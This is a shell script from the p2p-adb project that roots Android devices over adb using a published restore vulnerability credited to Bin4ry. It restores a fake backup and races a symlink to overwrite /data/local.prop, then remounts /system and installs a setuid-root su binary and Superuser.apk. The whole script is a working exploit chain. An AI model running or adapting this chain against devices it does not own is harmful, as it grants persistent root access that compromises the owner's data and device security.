# p2p-adb
# https://github.com/kosborn/p2p-adb/
# @theKos
# kyle@kyleosborn.com

# This vulnerability discovered here: 
# http://forum.xda-developers.com/showthread.php?t=1886460
# By Bin4ry 


adb restore modules/extras/fakebackup.ab

command "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo 'Overwrote local.prop!';" 

if command "cat /data/local.prop" 
	then echo "Succesfully rooted!"
	echo "Requires a reboot..."
	adb reboot
	sleep 2
	adb wait-for-device
	command "mount -o rw,remount /system"
	adb push includes/su-static /system/xbin/su
	command "/data/local/tmp/busybox chown 0:0 /system/xbin/su"
	command "/data/local/tmp/busybox chmod 6777 /system/xbin/su"
	adb push includes/Superuser.apk /system/app/
	command "rm /data/local.prop"
	adb reboot
fi
